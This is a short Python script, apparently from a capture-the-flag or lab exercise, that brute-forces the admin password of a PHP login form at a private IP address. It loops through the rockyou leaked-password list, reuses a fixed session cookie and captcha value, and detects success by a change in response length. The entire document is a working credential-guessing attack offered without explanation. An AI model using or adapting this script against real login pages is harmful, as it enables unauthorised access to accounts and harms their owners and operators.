#!/bin/python3

import requests
import sys
import time
from pwn import log

main_url = "http://192.168.0.103/auth.php"
cookies = {"PHPSESSID":"6sulea2cgu9g5tqbvqd0fqgn8t"}


def bruteforce():
    p1 = log.progress("Bruteforce")
    p1.status("Starting bruteforce to Login panel")
    time.sleep(2)

    with open('/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt','r',encoding='utf-8') as dict:
        for line in dict:
            content = {"username":"admin","password": line.strip(),"captcha":"z6bdv"}
            p1.status(f"Trying password: {line.strip()}")
            r = requests.post(main_url,data=content,cookies=cookies)

            if len(r.content) != 2346:
                p1.success(f"Password Found!! ---> {line.strip()}")
                sys.exit(0)

def main():
    bruteforce()

if __name__ == '__main__':
    main()
